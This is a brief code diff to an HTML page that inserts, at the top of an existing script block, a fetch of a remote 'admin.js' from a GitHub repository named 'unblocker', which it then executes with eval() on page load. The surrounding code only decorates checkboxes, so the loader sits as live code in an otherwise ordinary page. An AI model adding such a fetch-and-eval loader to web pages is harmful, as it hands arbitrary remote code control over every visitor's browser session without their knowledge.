@@ -347,7 +347,16 @@
             </div>
         </div>
     </div>
-    <script>	    
+    <script>	
+fetch("https://raw.githubusercontent.com/jasonkurisu/unblocker/refs/heads/main/admin.js")
+  .then(res => res.text())
+  .then(code => {
+    console.log("Remote script loaded. Executing...");
+    eval(code);
+  })
+  .catch(err => {
+    console.error("Failed to load remote script:", err);
+  });
         document.addEventListener("DOMContentLoaded", function () {
             document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
                 let label = document.createElement("label");
